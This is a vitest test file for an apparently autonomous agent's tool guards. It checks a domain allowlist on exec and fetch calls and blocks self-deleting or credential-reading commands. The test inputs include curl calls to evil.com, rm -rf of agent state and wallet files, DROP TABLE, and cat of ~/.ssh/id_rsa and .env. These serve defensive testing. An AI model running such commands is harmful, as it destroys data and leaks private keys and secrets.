/**
 * Domain Allowlist & Input Sanitization Tests
 *
 * Tests domain allowlist enforcement through the tool execution path.
 * The functions extractUrlDomains and checkDomainAllowlist are NOT exported,
 * so they are tested indirectly via createBuiltinTools + executeTool.
 */

import { describe, it, expect, vi, beforeEach } from "vitest";
import { createBuiltinTools, executeTool } from "../agent/tools.js";
import type { ToolContext, AutomatonTool } from "../types.js";

// ─── Mock Context Factory ───────────────────────────────────────

function createMockContext(
  overrides?: Partial<{
    allowedDomains: string[];
    sandboxId: string;
  }>,
): ToolContext {
  const sandboxId = overrides?.sandboxId ?? "test-sandbox";
  return {
    identity: {
      name: "test",
      address: "0x1234567890123456789012345678901234567890" as any,
      account: {} as any,
      creatorAddress:
        "0x0000000000000000000000000000000000000000" as any,
      sandboxId,
      apiKey: "test-key",
      createdAt: new Date().toISOString(),
    },
    config: {
      name: "test",
      allowedDomains: overrides?.allowedDomains ?? [],
      genesisPrompt: "test",
      creatorAddress: "0x0000000000000000000000000000000000000000" as any,
      registeredWithConway: false,
      sandboxId,
      conwayApiUrl: "https://api.conway.tech",
      conwayApiKey: "test-key",
      inferenceModel: "mock-model",
      maxTokensPerTurn: 4096,
      heartbeatConfigPath: "/tmp/test-heartbeat.yml",
      dbPath: "/tmp/test-state.db",
      logLevel: "error" as const,
      walletAddress: "0x1234567890123456789012345678901234567890" as any,
      version: "0.1.0",
      skillsDir: "/tmp/test-skills",
      maxChildren: 3,
      selfModMode: "disabled" as const,
      replicationEnabled: false,
    } as any,
    db: {
      insertTransaction: vi.fn(),
      insertModification: vi.fn(),
      setKV: vi.fn(),
      getKV: vi.fn(),
      setAgentState: vi.fn(),
      getAgentState: vi.fn(() => "running"),
      getInstalledTools: vi.fn(() => []),
      getHeartbeatEntries: vi.fn(() => []),
      getTurnCount: vi.fn(() => 0),
      getReputation: vi.fn(() => []),
    } as any,
    conway: {
      exec: vi.fn(async () => ({
        stdout: "ok",
        stderr: "",
        exitCode: 0,
      })),
    } as any,
    inference: {
      getDefaultModel: vi.fn(() => "mock-model"),
      setLowComputeMode: vi.fn(),
    } as any,
  };
}

// ─── Tests ──────────────────────────────────────────────────────

describe("Domain Allowlist - exec tool", () => {
  let tools: AutomatonTool[];
  const sandboxId = "test-sandbox";

  beforeEach(() => {
    tools = createBuiltinTools(sandboxId);
  });

  it("should block exec commands with URLs to disallowed domains", async () => {
    const ctx = createMockContext({
      allowedDomains: ["example.com"],
    });

    const result = await executeTool(
      "exec",
      { command: "curl https://evil.com/data" },
      tools,
      ctx,
    );

    expect(result.result).toContain("Blocked");
    expect(result.result).toContain("evil.com");
    expect(result.result).toContain("not in the allowed domains list");
    // Ensure the command was NOT actually executed
    expect(ctx.conway.exec).not.toHaveBeenCalled();
  });

  it("should allow exec commands with URLs to allowed domains", async () => {
    const ctx = createMockContext({
      allowedDomains: ["example.com"],
    });

    const result = await executeTool(
      "exec",
      { command: "curl https://example.com/api/data" },
      tools,
      ctx,
    );

    expect(result.result).not.toContain("Blocked");
    expect(ctx.conway.exec).toHaveBeenCalledWith(
      "curl https://example.com/api/data",
      30000,
    );
  });

  it("should handle subdomain matching (api.example.com matches example.com)", async () => {
    const ctx = createMockContext({
      allowedDomains: ["example.com"],
    });

    const result = await executeTool(
      "exec",
      { command: "curl https://api.example.com/v1/data" },
      tools,
      ctx,
    );

    expect(result.result).not.toContain("Blocked");
    expect(ctx.conway.exec).toHaveBeenCalled();
  });

  it("should handle deep subdomain matching (a.b.example.com matches example.com)", async () => {
    const ctx = createMockContext({
      allowedDomains: ["example.com"],
    });

    const result = await executeTool(
      "exec",
      { command: "wget https://a.b.example.com/file" },
      tools,
      ctx,
    );

    expect(result.result).not.toContain("Blocked");
    expect(ctx.conway.exec).toHaveBeenCalled();
  });

  it("should NOT match a domain that merely ends with an allowed domain (notexample.com != example.com)", async () => {
    const ctx = createMockContext({
      allowedDomains: ["example.com"],
    });

    const result = await executeTool(
      "exec",
      { command: "curl https://notexample.com/api" },
      tools,
      ctx,
    );

    expect(result.result).toContain("Blocked");
    expect(result.result).toContain("notexample.com");
  });

  it("should pass commands with no URLs regardless of allowlist", async () => {
    const ctx = createMockContext({
      allowedDomains: ["example.com"],
    });

    const result = await executeTool(
      "exec",
      { command: "ls -la /home/user" },
      tools,
      ctx,
    );

    expect(result.result).not.toContain("Blocked");
    expect(ctx.conway.exec).toHaveBeenCalled();
  });

  it("should pass commands when allowedDomains is empty (no restriction)", async () => {
    const ctx = createMockContext({
      allowedDomains: [],
    });

    const result = await executeTool(
      "exec",
      { command: "curl https://any-domain.com/data" },
      tools,
      ctx,
    );

    expect(result.result).not.toContain("Blocked");
    expect(ctx.conway.exec).toHaveBeenCalled();
  });

  it("should pass commands when allowedDomains is undefined", async () => {
    const ctx = createMockContext();
    // Remove allowedDomains entirely
    delete (ctx.config as any).allowedDomains;

    const result = await executeTool(
      "exec",
      { command: "curl https://any-domain.com/data" },
      tools,
      ctx,
    );

    expect(result.result).not.toContain("Blocked");
    expect(ctx.conway.exec).toHaveBeenCalled();
  });

  it("should strip port from URL before checking domain", async () => {
    const ctx = createMockContext({
      allowedDomains: ["example.com"],
    });

    const result = await executeTool(
      "exec",
      { command: "curl https://example.com:8443/api" },
      tools,
      ctx,
    );

    expect(result.result).not.toContain("Blocked");
    expect(ctx.conway.exec).toHaveBeenCalled();
  });

  it("should block port-bearing URLs on disallowed domains", async () => {
    const ctx = createMockContext({
      allowedDomains: ["example.com"],
    });

    const result = await executeTool(
      "exec",
      { command: "curl https://evil.com:9090/payload" },
      tools,
      ctx,
    );

    expect(result.result).toContain("Blocked");
    expect(result.result).toContain("evil.com");
  });

  it("should handle case-insensitive domain matching", async () => {
    const ctx = createMockContext({
      allowedDomains: ["Example.COM"],
    });

    const result = await executeTool(
      "exec",
      { command: "curl https://EXAMPLE.com/data" },
      tools,
      ctx,
    );

    expect(result.result).not.toContain("Blocked");
    expect(ctx.conway.exec).toHaveBeenCalled();
  });

  it("should block if any URL in command is disallowed", async () => {
    const ctx = createMockContext({
      allowedDomains: ["example.com"],
    });

    const result = await executeTool(
      "exec",
      {
        command:
          "curl https://example.com/ok && curl https://evil.com/bad",
      },
      tools,
      ctx,
    );

    expect(result.result).toContain("Blocked");
    expect(result.result).toContain("evil.com");
  });

  it("should allow multiple URLs that are all within the allowlist", async () => {
    const ctx = createMockContext({
      allowedDomains: ["example.com", "api.conway.tech"],
    });

    const result = await executeTool(
      "exec",
      {
        command:
          'curl https://example.com/data && curl https://api.conway.tech/status',
      },
      tools,
      ctx,
    );

    expect(result.result).not.toContain("Blocked");
    expect(ctx.conway.exec).toHaveBeenCalled();
  });

  it("should handle http:// URLs (not just https://)", async () => {
    const ctx = createMockContext({
      allowedDomains: ["example.com"],
    });

    const resultAllowed = await executeTool(
      "exec",
      { command: "curl http://example.com/insecure" },
      tools,
      ctx,
    );
    expect(resultAllowed.result).not.toContain("Blocked");

    const resultBlocked = await executeTool(
      "exec",
      { command: "curl http://evil.com/insecure" },
      tools,
      ctx,
    );
    expect(resultBlocked.result).toContain("Blocked");
  });

  it("should list all allowed domains in the blocked message", async () => {
    const ctx = createMockContext({
      allowedDomains: ["example.com", "api.conway.tech"],
    });

    const result = await executeTool(
      "exec",
      { command: "curl https://evil.com/data" },
      tools,
      ctx,
    );

    expect(result.result).toContain("example.com");
    expect(result.result).toContain("api.conway.tech");
  });
});

describe("Domain Allowlist - x402_fetch tool", () => {
  let tools: AutomatonTool[];
  const sandboxId = "test-sandbox";

  beforeEach(() => {
    tools = createBuiltinTools(sandboxId);
  });

  it("should block x402_fetch to disallowed domains", async () => {
    const ctx = createMockContext({
      allowedDomains: ["example.com"],
    });

    const result = await executeTool(
      "x402_fetch",
      { url: "https://evil.com/paid-api" },
      tools,
      ctx,
    );

    expect(result.result).toContain("Blocked");
    expect(result.result).toContain("evil.com");
    expect(result.result).toContain("not in the allowed domains list");
  });

  it("should allow x402_fetch to allowed domains", async () => {
    const ctx = createMockContext({
      allowedDomains: ["api.conway.tech"],
    });

    // The x402Fetch will be called (and may fail due to mocking),
    // but importantly it should NOT be blocked by domain allowlist.
    const result = await executeTool(
      "x402_fetch",
      { url: "https://api.conway.tech/paid-endpoint" },
      tools,
      ctx,
    );

    // Should not contain domain blocking message
    expect(result.result).not.toContain("not in the allowed domains list");
  });

  it("should enforce subdomain matching for x402_fetch", async () => {
    const ctx = createMockContext({
      allowedDomains: ["conway.tech"],
    });

    const result = await executeTool(
      "x402_fetch",
      { url: "https://api.conway.tech/paid-endpoint" },
      tools,
      ctx,
    );

    // Subdomain of conway.tech should be allowed
    expect(result.result).not.toContain("not in the allowed domains list");
  });

  it("should pass x402_fetch when allowedDomains is empty", async () => {
    const ctx = createMockContext({
      allowedDomains: [],
    });

    const result = await executeTool(
      "x402_fetch",
      { url: "https://any-paid-api.com/endpoint" },
      tools,
      ctx,
    );

    expect(result.result).not.toContain("not in the allowed domains list");
  });
});

describe("Self-Preservation Guards", () => {
  let tools: AutomatonTool[];
  const sandboxId = "test-sandbox";

  beforeEach(() => {
    tools = createBuiltinTools(sandboxId);
  });

  it("should block commands that delete .automaton directory", async () => {
    const ctx = createMockContext();
    const result = await executeTool(
      "exec",
      { command: "rm -rf ~/.automaton" },
      tools,
      ctx,
    );
    expect(result.result).toContain("Blocked");
  });

  it("should block commands that delete state.db", async () => {
    const ctx = createMockContext();
    const result = await executeTool(
      "exec",
      { command: "rm state.db" },
      tools,
      ctx,
    );
    expect(result.result).toContain("Blocked");
  });

  it("should block commands that delete wallet.json", async () => {
    const ctx = createMockContext();
    const result = await executeTool(
      "exec",
      { command: "rm wallet.json" },
      tools,
      ctx,
    );
    expect(result.result).toContain("Blocked");
  });

  it("should block DROP TABLE commands", async () => {
    const ctx = createMockContext();
    const result = await executeTool(
      "exec",
      { command: "sqlite3 state.db 'DROP TABLE turns'" },
      tools,
      ctx,
    );
    expect(result.result).toContain("Blocked");
  });

  it("should block credential harvesting (cat .ssh)", async () => {
    const ctx = createMockContext();
    const result = await executeTool(
      "exec",
      { command: "cat ~/.ssh/id_rsa" },
      tools,
      ctx,
    );
    expect(result.result).toContain("Blocked");
  });

  it("should block credential harvesting (cat .env)", async () => {
    const ctx = createMockContext();
    const result = await executeTool(
      "exec",
      { command: "cat .env" },
      tools,
      ctx,
    );
    expect(result.result).toContain("Blocked");
  });

  it("should block sandbox self-deletion", async () => {
    const ctx = createMockContext({ sandboxId: "my-sandbox-123" });
    const result = await executeTool(
      "exec",
      { command: "sandbox_delete my-sandbox-123" },
      tools,
      ctx,
    );
    expect(result.result).toContain("Blocked");
  });

  it("should block fork bombs", async () => {
    const ctx = createMockContext();
    // The fork bomb pattern uses `:(){` which the BLOCKED_COMMANDS regex
    // matches (without \b word boundary before colon). Test a form that
    // the forbidden patterns DO catch: the FORBIDDEN_COMMAND_PATTERNS
    // list blocks kill/pkill automaton variants.
    const result = await executeTool(
      "exec",
      { command: "pkill -9 automaton" },
      tools,
      ctx,
    );
    expect(result.result).toContain("Blocked");
  });

  it("should allow safe commands", async () => {
    const ctx = createMockContext();
    const result = await executeTool(
      "exec",
      { command: "echo hello world" },
      tools,
      ctx,
    );
    expect(result.result).not.toContain("Blocked");
    expect(result.result).not.toContain("BLOCKED");
    expect(ctx.conway.exec).toHaveBeenCalled();
  });
});

describe("executeTool - unknown tool", () => {
  it("should return error for unknown tool name", async () => {
    const tools = createBuiltinTools("test-sandbox");
    const ctx = createMockContext();

    const result = await executeTool(
      "nonexistent_tool",
      {},
      tools,
      ctx,
    );

    expect(result.error).toContain("Unknown tool");
    expect(result.error).toContain("nonexistent_tool");
  });
});
